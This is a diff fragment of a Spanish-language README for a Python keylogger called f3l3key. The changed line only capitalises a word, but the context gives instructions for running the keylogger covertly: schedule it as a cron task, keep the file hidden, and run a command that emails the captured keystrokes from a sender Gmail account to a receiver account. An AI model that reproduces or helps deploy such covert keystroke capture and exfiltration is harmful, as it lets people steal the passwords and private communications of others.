@@ -13,7 +13,7 @@ diríjete a este artículo: https://f3l3p1n0.github.io/posts/f3l3key/post.html<b
 6- Guarda el archivo y habrás creada la nueva tarea Cron.<br>
 7- Listo, ahora debes esperar los minutos correspondientes para recibir en tu cuenta receptora los correos.<br><br>
 
-pd: es recomendable que el keylogger se ubique en una posición oculta. Ten en cuenta que debes especificar la ruta donde se encuentra el keylogger, de lo contrario no funcionará. De igual manera, debes respetar la siguiente linea con los mismos espacios y estructura:
+pd: Es recomendable que el keylogger se ubique en una posición oculta. Ten en cuenta que debes especificar la ruta donde se encuentra el keylogger, de lo contrario no funcionará. De igual manera, debes respetar la siguiente linea con los mismos espacios y estructura:
 
 python3 /home/user/Descargas/f3l3key.py emisor@gmail.com pega_la_clave_aqui receptor@hotmail.com &
 
